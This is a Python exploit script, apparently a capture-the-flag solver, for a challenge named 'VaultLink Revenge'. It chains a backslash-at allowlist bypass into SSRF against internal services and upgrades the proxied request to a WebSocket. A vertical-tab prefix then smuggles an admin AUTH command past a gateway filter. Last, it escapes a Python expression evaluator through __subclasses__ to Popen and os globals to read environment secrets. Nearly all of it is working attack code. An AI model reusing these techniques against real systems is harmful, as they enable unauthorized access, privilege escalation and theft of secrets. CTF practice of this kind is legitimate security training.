#!/usr/bin/env python3
"""VaultLink Revenge 利用脚本 (Python 3 标准库).

链: /api/proxy 白名单的 \\@ 解析差异 -> 任意内网 SSRF
    -> 127.0.0.1:31337/config 取 vault_session_seed / relay_endpoint
    -> 把同一 URL 升级成 WebSocket 连到 127.0.0.1:8081/ws, IDENT 绑定会话
    -> 网关只按原始字节拦 AUTH, relay 会先 strip/split, 用 \\x0b 前缀拿 admin
    -> DIAG 用 [] 反射到 object.__subclasses__() -> subprocess.Popen
       -> __init__.__globals__['os'].environ['ICQ_FLAG']

用法:
    python exp.py --base http://TARGET
    python exp.py --base http://1.2.3.4:36875 --timeout 8
"""

import argparse
import base64
import hashlib
import http.client
import json
import os
import re
import socket
import struct
from urllib.parse import quote, urlparse

ALLOWLIST_HOST = "rates.partner-forex.example.com"
FLAG_RE = re.compile(r"flag\{[^{}\r\n]+\}")


def proxy_path(url):
    return "/api/proxy?url=" + quote(url, safe="")


def get_config(host, port, timeout):
    target = "http://%s\\@127.0.0.1:31337/config" % ALLOWLIST_HOST
    connection = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        connection.request("GET", proxy_path(target), headers={"Host": host})
        response = connection.getresponse()
        body = response.read()
        if response.status != 200:
            raise RuntimeError("/config: HTTP %d: %r" % (response.status, body[:200]))
        config = json.loads(body)
        if not config.get("vault_session_seed") or not config.get("relay_endpoint"):
            raise RuntimeError("/config 缺少 seed 或 relay_endpoint")
        return config
    finally:
        connection.close()


class WebSocket:
    def __init__(self, host, port, path, timeout):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.buffer = bytearray()
        key = base64.b64encode(os.urandom(16)).decode("ascii")
        request = (
            "GET %s HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "Connection: Upgrade\r\n"
            "Upgrade: websocket\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "Sec-WebSocket-Key: %s\r\n"
            "\r\n" % (path, host, port, key)
        ).encode("ascii")
        self.sock.sendall(request)
        header = self._read_until(b"\r\n\r\n")
        status = header.split(b"\r\n", 1)[0]
        if b" 101 " not in status:
            raise RuntimeError("WebSocket 握手失败: %r" % status)
        expected = base64.b64encode(
            hashlib.sha1((key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()).digest()
        )
        if b"sec-websocket-accept: " + expected.lower() not in header.lower():
            raise RuntimeError("WebSocket 握手的 Sec-WebSocket-Accept 不匹配")

    def _read_until(self, marker):
        while marker not in self.buffer:
            data = self.sock.recv(4096)
            if not data:
                raise EOFError("握手期间连接关闭")
            self.buffer.extend(data)
        end = self.buffer.index(marker) + len(marker)
        result = bytes(self.buffer[:end])
        del self.buffer[:end]
        return result

    def _read_exact(self, count):
        while len(self.buffer) < count:
            data = self.sock.recv(max(4096, count - len(self.buffer)))
            if not data:
                raise EOFError("WebSocket 连接关闭")
            self.buffer.extend(data)
        result = bytes(self.buffer[:count])
        del self.buffer[:count]
        return result

    def send_frame(self, opcode, payload):
        mask = os.urandom(4)
        length = len(payload)
        if length < 126:
            header = bytes((0x80 | opcode, 0x80 | length))
        elif length < 65536:
            header = bytes((0x80 | opcode, 0x80 | 126)) + struct.pack("!H", length)
        else:
            header = bytes((0x80 | opcode, 0x80 | 127)) + struct.pack("!Q", length)
        masked = bytes(value ^ mask[index % 4] for index, value in enumerate(payload))
        self.sock.sendall(header + mask + masked)

    def send(self, message):
        self.send_frame(1, message.encode("utf-8"))

    def recv(self):
        fragments = []
        while True:
            first, second = self._read_exact(2)
            opcode = first & 0x0F
            if first & 0x40:
                raise RuntimeError("服务端返回压缩帧; 脚本未协商压缩")
            length = second & 0x7F
            if length == 126:
                length = struct.unpack("!H", self._read_exact(2))[0]
            elif length == 127:
                length = struct.unpack("!Q", self._read_exact(8))[0]
            mask = self._read_exact(4) if second & 0x80 else None
            payload = self._read_exact(length)
            if mask:
                payload = bytes(value ^ mask[index % 4] for index, value in enumerate(payload))
            if opcode == 9:
                self.send_frame(10, payload)
                continue
            if opcode == 10:
                continue
            if opcode == 8:
                raise EOFError("服务端关闭 WebSocket: %r" % payload)
            if opcode not in (0, 1, 2):
                raise RuntimeError("不支持的 WebSocket opcode: %d" % opcode)
            fragments.append(payload)
            if first & 0x80:
                return b"".join(fragments).decode("utf-8", "replace")

    def close(self):
        try:
            self.send_frame(8, b"")
        except (OSError, EOFError):
            pass
        self.sock.close()


def diag(ws, expression):
    ws.send("DIAG " + expression)
    return ws.recv()


def find_popen_index(ws):
    classes = '1["__class__"]["__base__"]["__subclasses__"]()'
    candidates = [241] + [index for index in range(400) if index != 241]
    for index in candidates:
        if diag(ws, "%s[%d][\"__name__\"]" % (classes, index)) == "RESULT Popen":
            return index
    raise RuntimeError("未找到 subprocess.Popen 类; 检查 Python 运行时是否改变")


def solve(host, port, timeout):
    config = get_config(host, port, timeout)
    seed = config["vault_session_seed"]
    print("[+] seed = %s, relay = %s" % (seed, config["relay_endpoint"]))

    relay = "http://%s\\@%s" % (ALLOWLIST_HOST, config["relay_endpoint"])
    ws = WebSocket(host, port, proxy_path(relay), timeout)
    try:
        greeting = ws.recv()
        ready = ws.recv()
        if not greeting.startswith("SESSION ") or not ready.startswith("READY "):
            raise RuntimeError("意外的 relay 问候: %r, %r" % (greeting, ready))
        nonce = greeting.split(" ", 1)[1]
        ws.send("IDENT " + nonce)
        ident = ws.recv()
        if ident != "OK session-bound":
            raise RuntimeError("会话绑定失败: %s" % ident)
        ws.send("\x0bAUTH admin " + seed)  # 0x0b: 网关看不见, relay strip 后是 AUTH
        auth = ws.recv()
        if auth != "AUTH-OK admin":
            raise RuntimeError("管理认证失败: %s" % auth)
        print("[+] relay 会话已绑定, 管理认证通过")

        index = find_popen_index(ws)
        os_object = (
            '1["__class__"]["__base__"]["__subclasses__"]()[%d]' % index
            + '["__init__"]["__globals__"]["os"]'
        )
        result = diag(ws, os_object + '["environ"]["get"]("ICQ_FLAG")')
        match = FLAG_RE.search(result)
        if not match:
            raise RuntimeError("未从 ICQ_FLAG 获得 flag: %s" % result)
        flag = match.group(0)
        print("[+] " + flag)

        stat = diag(ws, os_object + '["stat"]("/flag")')
        readable = diag(ws, os_object + '["access"]("/flag",4)')
        print("[i] /flag stat: %s" % stat)
        print("[i] relay 账户可读 /flag: %s" % readable)
        return flag
    finally:
        ws.close()


def main():
    parser = argparse.ArgumentParser(description="VaultLink Revenge solver")
    parser.add_argument("--base", default="http://TARGET", help="题目入口, 例如 http://1.2.3.4:36875")
    parser.add_argument("--timeout", type=float, default=5.0, help="网络超时秒数")
    args = parser.parse_args()

    parsed = urlparse(args.base if "://" in args.base else "http://" + args.base)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    try:
        solve(host, port, args.timeout)
    except (OSError, EOFError, TimeoutError, RuntimeError, ValueError, KeyError) as exc:
        raise SystemExit("[-] %s" % exc)


if __name__ == "__main__":
    main()
